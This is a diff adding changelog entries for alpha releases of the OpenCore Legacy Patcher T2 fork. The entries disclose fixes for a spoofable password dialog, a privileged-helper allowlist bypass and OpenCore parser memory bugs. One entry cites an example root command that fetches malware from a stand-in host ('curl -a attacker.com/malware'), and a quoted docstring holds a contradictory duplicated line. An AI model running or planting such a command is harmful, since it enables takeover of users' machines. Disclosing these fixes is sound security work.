@@ -1,4 +1,139 @@
 # OpenCore Legacy Patcher T2 changelog / OpenCore Legacy Patcher T2-Änderungsprotokoll
+## 4.0.0.19006.6 - 4.0.0 alpha 19.6.6
+**NOTICE:**
+
+The old OpenCore Legacy Patcher password prompt dialog is deprecated. DO NOT, under any circumstances enter your password into any of them starting with version `4.0.0.190006`. OCLPT2 now *only* uses Apple's official password prompt.
+
+This release:
+- fixes a bug where after the password mechanism has been changed, it was still appearing a popup where it says this: OpenCore Legacy Patcher could not unlock Universal-Binaries.dmg automatically. If macOS asks for a password for this disk image, the password is: password. Since 4.0.0.190006, this message has been already obsolete and now asks for the macOS password instead.
+- fixes the following vulnerability:
+
+          def _is_encrypted(self, dmg_path: Path) -> bool:
+                  """Whether hdiutil considers the image encrypted, ie. whether it will prompt for a passphrase at all.
+          
+                  Deliberately fail-open: if the check cannot be run or its wording changes,
+                  assume encrypted and show the notice. A superfluous notice is harmless,
+                  a missing one leaves the user staring at an unanswerable system prompt.
+                  assume encrypted and supply the passphrase anyway.
+                  """
+                  try:
+                      result = subprocess.run(
+                          ["/usr/bin/hdiutil", "isencrypted", str(dmg_path)],
+                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=30
+                      )
+                  except Exception as e:
+                      logging.error(f"- Failed to check if DMG is encrypted: {e}")
+                      logging.exception("Stack Trace:")
+                      return True
+                  output = result.stdout.decode(errors="ignore").lower()
+                  # hdiutil has printed both "encrypted: YES/NO" and "encrypted: 1/0" across releases.
+                  return not ("encrypted: no" in output or "encrypted: 0" in output)
+          
+              def _display_universal_binaries_password_notice(self) -> None: # <- the entire function here has a vulnerability where an attacker could set up a lookalike popup in a malicious script to trick the victim into granting the attacker root access, or worse, for phishing
+                  """Heads-up dialog shown before falling back to hdiutil's own passphrase prompt.
+          
+                  Only reached when the built-in passphrase did not unlock the image. hdiutil
+                  then asks for it through a bare macOS system prompt that names only the disk
+                  image and gives no indication of what to type, which reads like an
+                  unexplained password request in the middle of root patching. State the
+                  passphrase ourselves beforehand so the prompt is answerable.
+                  """
+                  if self.constants.cli_mode is True:
+                      return
+                  try:
+                      applescript.AppleScript(
+                          f'display dialog "OpenCore Legacy Patcher could not unlock Universal-Binaries.dmg automatically.\\n\\nIf macOS asks for a password for this disk image, the password is:\\n\\n{UNIVERSAL_BINARIES_PASSPHRASE}" buttons {{"OK"}} default button "OK" with title "OpenCore Legacy Patcher"{subprocess_wrapper.applescript_icon_clause(self.icon_path)}'
+                      ).run()
+                  except Exception as e:
+                      logging.error(f"- Failed to display Universal-Binaries.dmg password notice: {e}")
+
+Impact: an attacker could set up a malicious script with a lookalike popup that says OpenCore Legacy Patcher could not unlock Universal-Binaries.dmg automatically to trick the victim into granting the attacker root access via living-off-the-land techniques and phishing. Or worse, an attacker could intentionally fall back to the obsolete logic to launch phishing attacks and take over the victim's computer. This vulnerability has been fixed by removing the obsolete function  _display_universal_binaries_password_notice.
+
+## 4.0.0.19006.5 - 4.0.0 alpha 19.6.5
+**NOTICE:**
+
+The old OpenCore Legacy Patcher password prompt dialog is deprecated. DO NOT, under any circumstances enter your password into any of them starting with version `4.0.0.190006`. OCLPT2 now *only* uses Apple's official password prompt.
+
+This release:
+- fixes a bug where on T2 Macs gets injected CatalinaBCM5701Ethernet.kext while the Macs that really require this kext skip it, causing on T2 Macs to show an AppleKeyStore kernel panic while on the Macs that really need this kext for Ethernet to have 0 Ethernet at all.
+- now for downloading macOS installers, only the amount of space that the installer demands is required instead of 45GB, thx @gandolf243 
+
+## 4.0.0.19006.4 - 4.0.0 alpha 19.6.4
+This release fixes a bug where if the certificate of the Priveleged Helper Tool is invalid (e.g when running from source or a fork) and falls back to osascript, when building OpenCore EFI, the following error shows up:
+
+            Mounte Partition: disk0s6
+            Mounting partition: disk0s6
+            Privileged Helper Tool rejected this build (OCLP_PHT_ERROR_INVALID_CERTIFICATES), not using it for the rest of this session.
+            Checking hard disk type
+            Mounting the EFI partition
+            File operation failed during installation: encoding without a string argument
+            Stack Trace:
+            Traceback (most recent call last):
+              File "opencore_legacy_patcher/support/install.py", line 163, in install_opencore
+              File "opencore_legacy_patcher/support/subprocess_wrapper.py", line 714, in run_as_root_and_verify
+              File "opencore_legacy_patcher/support/subprocess_wrapper.py", line 292, in run_as_root
+              File "opencore_legacy_patcher/support/utilities.py", line 600, in get_admin_permission
+            TypeError: encoding without a string argument
+            Please try again later.
+
+## 4.0.0.19006.3 - 4.0.0 alpha 19.6.3
+This release:
+- fixes a bug where even when Disable AMFIPass is explicitly enabled in Settings, the patcher was still stripping out amfi=0x80 and that caused certain Macs to get stuck at a login loop when trying to sign in, thx @Medelcartelinc 
+- fixes a bug in the Priveleged Helper Tool  where when I was fixing a vulnerability that would let attackers execute arbitary code as root, in the mitigated code there was a bug, where the restriction of which commands are allowed to execute were also enforced on the release build, which at the end caused this error while trying to root patch:
+
+            Subprocess failed.
+                Command: ['/Library/PrivilegedHelperTools/com.albert-mueller.opencore-patcher-t2.privileged-helper', PosixPath('/var/folders/sf/89g8z5hs59g5r75hxfdkdg_r0000gp/T/tmpix_lubct/payloads/Tools/RSRRepair'), '--install']
+                Return Code: 171
+                    Likely Enum: OCLP_PHT_ERROR_COMMAND_NOT_ALLOWED
+                Standard Output:
+                    None
+                Standard Error:
+                    None
+
+This bug is fixed by enforcing the restrictions of which commands are allowed to be executed only on Debug builds. It was intended this restriction to be only for Debug builds.
+Previously prior to this patch, an attacker could execute any command (e.g curl -a attacker.com/malware) as root by abusing the Priveleged Helper Tool via living-off-the-land techniques.
+
+## 4.0.0.19006.2 - 4.0.0 alpha 19.6.2
+This release:
+- fixes AttributeError while trying to install root patches
+- now requires MacPorts to be installed to build the app; Homebrew requires Apple Silicon
+
+## 4.0.0.19006.1 - 4.0.0 alpha 19.6.1
+This release:
+- fixes a bug where upon updating the patcher or switching forks via switching the update channel, it starts a repair upgrade even if the update has successfully installed
+- fixes the mess of Metallibs APIs where the patcher may download Metallibs from the wrong API
+
+## 4.0.0.190006 - 4.0.0 alpha 19.6
+This release:
+- the "Downloading" window of the app updater now also shows the release notes of the version being downloaded, below the progress bar, instead of only the logo, the version and the Cancel button. Links open in the browser, and HTML inside the release notes is shown as text instead of being rendered. Other downloads (macOS installers, KDKs, metallibs) keep the compact window
+- fixes a bug where turning on "Turn Off Auto Updates" (or launching with --disable_auto_update) also turned off the automatic check for updates. As the setting describes, the app now still checks for updates automatically, but a found update is only offered in the "A new version is available" dialog instead of being downloaded and installed without asking. Manual checks and the "Update Later" snooze work as before
+- reworks how the app asks for administrator rights: the old self-made password dialog was replaced with the native macOS authorization prompt (utilities.get_admin_permission), and admin requests now go through one shared code path instead of several copies. Thx @gandolf243
+- fixes a vulnerability where the app asked for the administrator password in a plain AppleScript dialog (`osascript` `display dialog ... with hidden answer`). Because osascript is preinstalled on every Mac, any other program could show an identical-looking "OpenCore Legacy Patcher needs your administrator password" dialog with the app's own icon (a living-off-the-land social engineering attack), check the entered password with `sudo -v` and then use it to take over the Mac; users had no way to tell the real prompt from a fake one. The app also kept the password in memory for the rest of the session and piped it to `sudo -S` for every privileged command. Administrator rights are now requested through Apple's Security framework (Authorization Services, utilities.get_admin_permission): the password is entered in the system's own authorization prompt and never reaches the app. From now on, OpenCore Legacy Patcher T2 never asks for your password in its own dialog, so treat any such dialog as fake. Thx @gandolf243 https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/pull/445
+- fixes a bug where mounting the root volume for root patching could report success even when the mount failed, because the mount function returned the volume path instead of True/False. Thx @gandolf243
+- fixes an "Internal Error occurred!" crash on launch of the compiled app ("During unpacking of our internal files, we seemed to have encountered an error"): payloads.dmg was never mounted because the unpack step still referenced a password-prompt function that the admin rework had removed. payloads.dmg now uses the new native prompt, and the elevated mount now returns its result instead of None
+- fixes a vulnerability where the Privileged Helper Tool's command allowlist (added in 4.0.0.190004.6) could be bypassed: when the helper refused a command (not on the allowlist, /bin/sh -c ..., or /bin/sh and /usr/sbin/installer in Debug builds), the app ran the exact same command as root through a normal-looking admin password prompt instead. Refused commands (COMMAND_NOT_ALLOWED / COMMAND_MISSING) are now final and no other elevation path is tried
+- stores the app's PNG icons in a single OpenCore-Patcher-T2.assets file inside the app, with a shared icon loader (support/image_handler.py) that uses the file on disk if it exists and otherwise the assets file. Icons were converted from .icns to .png and resized to keep the file small; .icns files and Assets.car are still copied as real files, since macOS, NSImage and AppleScript dialogs need them. Thx @gandolf243
+- the About window now shows the dark app icon in Dark Mode, and its logo is embedded instead of loaded from GitHub, so it also works without internet. Thx @gandolf243
+- fixes a GUI crash on launch caused by the missing Constants.app_icons_resource_path, and points the root patching icon at the OC-Patch-*.png files, since the .icns versions it referenced don't exist
+- fixes a "no bitmap handler for type 50" error dialog for the main menu logo and the download window icon: .icns files are loaded as icons again, and an icon that fails to load is logged and falls back to the assets file or an empty image instead of showing an error dialog
+- injects dart=0 on all Macs without a T2 chip (not only a fixed list of iMac18,x, MacBookPro14,x and MacBookAir6,2), so VT-d/DART is disabled wherever legacy Wi-Fi/Bluetooth needs it on macOS 26 Tahoe. Core 2 Duo (Penryn and older) Macs are excluded
+- never injects dart=0 on T2 Macs: a dart=0 inherited from the template or earlier boot-args is removed, and the Mac Pro 2019 (MacPro7,1) is now correctly listed as a T2 Mac (the list contained the nonexistent MacPro9,1)
+- RestrictEvents is no longer injected on T2 Macs, and no revblock/revpatch NVRAM variables are written there; a separate T2 kext is in development. The "Allow Experimental T2 RestrictEvents Kext" setting was removed. Non-T2 Macs are unchanged
+- deprecates RestrictEvents-T2, and will be replaced by a kext that is currently still in development
+- removes unused kexts and payloads (CSLVFixup, AAAMouSSE 0.95, VirtualSMC, and the unused CpuTscSync, HibernationFixup, latebloom and CSLVFixup entries in config.plist)
+- removes root patches that could never do anything: CPUMissingAVX (never registered), the empty "T1 Login (Experimental)" entry that showed up on T1 Macs on Tahoe, and an uncalled Haswell framebuffer function
+- removes dead code (unused imports, unreachable statements, uncalled functions and old test scripts in the repository root). No change in behaviour intended
+- updates the bundled OpenCore (RELEASE/DEBUG), ocvalidate and macserial to 2.0.7, which fixes the following vulnerabilities in OpenCore's boot manager (OcBootManagementLib). Both also exist in upstream Acidanthera OpenCorePkg:
+
+        - an out-of-bounds read and write on the heap in OcParseVars: when a value ended in a backslash, the parser read the escaped character from the backslash itself instead of the next position, never saw the end of the string and kept reading and shifting heap memory past the end of the buffer. The parsed files include /etc/default/grub and /etc/os-release on any attached Linux volume, which OpenLinuxBoot reads automatically at every boot, so a crafted file on a USB stick or second drive was enough to corrupt memory in the bootloader. https://github.com/albert-mueller/OpenCorePkg-add-T2-support/commit/2859c4f355630b3459a001bd16304f94f8d8fc43
+        - use of an uninitialised stack buffer in OcCheckArgumentFromEnv: load options longer than BOOT_LINE_LENGTH or containing non-ASCII characters made the conversion fail without writing anything, so the unterminated, uninitialised buffer was then searched for boot arguments (and DEBUG builds hit an ASSERT). Load options are now treated as untrusted and copied with explicit bounds, and OpenCore no longer writes into the caller's buffer. https://github.com/albert-mueller/OpenCorePkg-add-T2-support/commit/2859c4f355630b3459a001bd16304f94f8d8fc43
+
+  OpenCore 2.0.7 also hardens the GitHub Actions workflows that build the bundled binaries (read-only token by default, no persisted checkout credentials, third-party actions pinned to a commit SHA), which makes it harder to tamper with release builds through a compromised action or workflow token. https://github.com/albert-mueller/OpenCorePkg-add-T2-support/commit/5a69ea03d5abca6cce4454a1eb9a9682fe8b2f17
+- updates WhateverGreen to 1.7.1, AirportBrcmFixup to 2.2.1, AppleALC to 1.9.8 and PatcherSupportPkg to 2.0.4 (removes patches that are no longer needed)
+- updates the Privileged Helper Tool binary with the command allowlist fix from 4.0.0.190004.6
+- fixes Build-Project.command not being executable
+- fixes the app updater sometimes failing with "Failed to install update automatically. Please visit the official repository ...". With a Debug build of the Privileged Helper Tool, /usr/sbin/installer is refused by design (and since the allowlist fix refusals are final), so the in-app update could never succeed there. The updater now hands such updates to the macOS Installer, which asks for authorization itself, and copies the package to ~/Downloads first, since the temporary folder it was opened from before is deleted when the app quits. Also fixes: a failed or cancelled install still continuing to "Update complete!" and launching an app that was never installed (sys.exit() inside a worker thread only ended that thread); the Authorization Services fallback returning before the installer had finished, which is now awaited and verified; a crash when that fallback returned str/None output; cancelling the prompt ("User canceled") not being recognised; and the ZIP update route downloading to a different file name than it extracted from, so it could never work. The error message now links the releases page instead of the placeholder "the official repository"
+
 ## 4.0.0.190004.6 - 4.0.0 alpha 19.4.6
 This release:
 - adds a dark variant of the app icon (OC-Patcher-Dark.icns) that is used on macOS 26 Tahoe and newer when Dark Mode is active: in the main menu logo, in the Dock while the app is running, and in the app's dialogs (admin prompts, update and auto-patcher dialogs). Switching between Light and Dark Mode while the app is open updates the icon immediately. If the dark icon file is missing, the regular icon is used. Thx @coolkid418 https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/issues/435
